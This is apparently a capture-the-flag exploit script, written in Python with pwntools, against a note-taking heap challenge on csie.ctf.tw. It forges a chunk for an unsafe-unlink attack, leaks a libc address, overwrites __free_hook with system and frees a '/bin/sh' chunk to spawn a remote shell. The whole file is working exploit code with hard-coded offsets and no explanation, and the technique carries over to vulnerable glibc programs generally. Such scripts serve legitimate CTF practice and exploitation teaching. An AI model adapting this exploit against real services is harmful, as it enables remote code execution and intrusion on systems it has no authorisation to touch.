#!/usr/bin/python
from pwn import *

host = 'localhost'
port = 4000

host = 'csie.ctf.tw'
port = 10134

context.arch = 'amd64'
r = remote(host, port)
note = 0x602040
def add(size, content):
    r.recvuntil('>')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    if(len(content) == size):
        r.send(content)
    else:
        r.sendline(content)

def show(idx):
    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil(': ')
    r.sendline(str(idx))
    return r.recvuntil('1. new')[:-6].strip()

def edit(idx, size, content):
    r.recvuntil('>')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    if(len(content) == size):
        r.send(content)
    else:
        r.sendline(content)

def free(idx):
    r.recvuntil('>')
    r.sendline('4')
    r.recvuntil(':')
    r.sendline(str(idx))


stdin_base = 0x3c38e0
free_hook = 0x3c57a8
system = 0x45390
add(0xf0, 'a') # 0
add(0xf0, 'a') # 1
add(0xf0, '/bin/sh\x00') # 2


edit(0, 0x100, flat([0, 0xf1, note-0x18, note-0x10]).ljust(0xf0, 'a') + p64(0xf0) + p64(0x100))
free(1)

# leak
edit(0, 0x8, 'a'*8)
ret = show(0)[8:]
stdin = u64(ret.strip().ljust(8, '\x00'))
print ('stdin : ', hex(stdin))
libc = stdin - stdin_base
print ('libc : ', hex(libc))
free_hook += libc
print ('free_hook : ', hex(free_hook))
system += libc
print ('system : ', hex(system))

# overwrite free_hook(buf)
edit(0, 0x20, 'a'*8 + p64(stdin) + 'a'*8 + p64(free_hook))
edit(0, 0x8, p64(system))
free(2)

r.interactive()
